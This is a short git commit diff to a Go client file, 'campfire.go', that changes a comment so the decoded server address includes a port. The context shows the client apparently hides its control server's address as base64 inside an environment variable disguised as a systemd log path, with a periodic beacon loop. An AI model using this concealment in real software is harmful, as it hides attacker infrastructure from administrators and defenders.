6626030ca6b99b1c326f3cac4f0cfcdc4f0472ba
degenerat3 <james.maskelony@gmail.com>
2019-04-13 16:31:07 -0400

    port from env too

--- client/campfire.go
+++ client/campfire.go
@@ -20,7 +20,7 @@ var serv = getServer() //IP of flask serv
 var loopTime = 300     //sleep time in seconds
 
 // turn encoded environment variable into ip addres
-// example env: "/var/log/systemd-MTkyLjE2OC4xLjE=" => 192.168.1.1
+// example env: "/var/log/systemd-MTkyLjE2OC4xLjE=" => 192.168.1.1:5000
 func getServer() string {
 	envVar := os.Getenv("ERROR_LOGGING") //fetch environment variable
 	trimmedStr := strings.Replace(envVar, "/var/log/systemd-", "", 1)
